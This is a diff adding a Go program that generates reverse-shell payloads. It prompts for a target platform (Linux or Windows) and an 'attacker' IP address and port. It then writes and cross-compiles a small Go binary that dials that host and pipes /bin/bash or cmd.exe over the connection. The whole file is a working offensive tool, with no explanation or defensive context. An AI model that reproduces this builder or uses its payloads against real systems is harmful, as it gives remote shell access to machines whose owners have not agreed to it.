@@ -1,0 +1,117 @@
+package main
+
+import (
+	"fmt"     // I/O Operations
+	"os"      // Interact with OS
+	"os/exec" // Allows you to run external commands from Go program
+)
+
+// Function to get a valid integer choice from the user
+func getIntChoice(prompt string, validChoices []int) int {
+	var choice int
+	for {
+		fmt.Print(prompt)
+		_, err := fmt.Scan(&choice)
+		if err != nil {
+			fmt.Println("Invalid input:", err)
+			continue
+		}
+		for _, valid := range validChoices {
+			if choice == valid {
+				return choice
+			}
+		}
+		fmt.Println("Invalid choice. Please enter a valid option.")
+	}
+}
+
+// Function to get a valid string input from the user
+func getStringInput(prompt string) string {
+	var input string
+	for {
+		fmt.Print(prompt)
+		_, err := fmt.Scan(&input)
+		if err != nil {
+			fmt.Println("Invalid input:", err)
+			continue
+		}
+		if input != "" {
+			return input
+		}
+		fmt.Println("Input cannot be empty. Please try again.")
+	}
+}
+
+func main() {
+
+	// Displaying the menu to create a payload
+	fmt.Println("Choose your target platform: ")
+	fmt.Println("1. Linux")
+	fmt.Println("2. Windows")
+
+	// Getting the user input to proceed
+	choice := getIntChoice("Enter your choice (1 or 2): ", []int{1, 2})
+
+	// Select Target OS and Shell Command
+	var targetOS, outputFile, shellCommand string
+
+	switch choice {
+	case 1:
+		targetOS = "linux"
+		outputFile = "reverseshell_linux"
+		shellCommand = "/bin/bash"
+	case 2:
+		targetOS = "windows"
+		outputFile = "reverseshell.exe"
+		shellCommand = "cmd.exe"
+	}
+
+	// Get IP and Port from the user
+	ipAddress := getStringInput("Enter the IP address of the attacker: ")
+	port := getStringInput("Enter the port number of the attacker: ")
+
+	// Unindenting the reverse shell code with user-provided IP and port
+	reverseShellCode := fmt.Sprintf(`package main
+
+import(
+	"net"
+	"os/exec"
+)
+
+func main() {
+	conn, err := net.Dial("tcp", "%s:%s")
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+
+	cmd := exec.Command("%s")
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+
+	cmd.Run()
+}
+`, ipAddress, port, shellCommand)
+
+	// Writing the reverse shell code to a file and setting permissions to 0644
+	err := os.WriteFile("reverseshell.go", []byte(reverseShellCode), 0644)
+	if err != nil {
+		fmt.Println("Error writing Go file:", err)
+		return
+	}
+
+	// Compiling the Go file
+	cmd := exec.Command("go", "build", "-o", outputFile, "reverseshell.go")
+	cmd.Env = append(os.Environ(), "GOOS="+targetOS)
+
+	output, err := cmd.CombinedOutput()  // Capture both stdout and stderr
+	if err != nil {
+		fmt.Println("Error compiling:", err)
+		fmt.Println("Output:", string(output))  // Print the output for debugging
+		return
+	}
+
+	// Printing final message with the filename
+	fmt.Printf("Reverse shell executable created: %s\n", outputFile)
+}
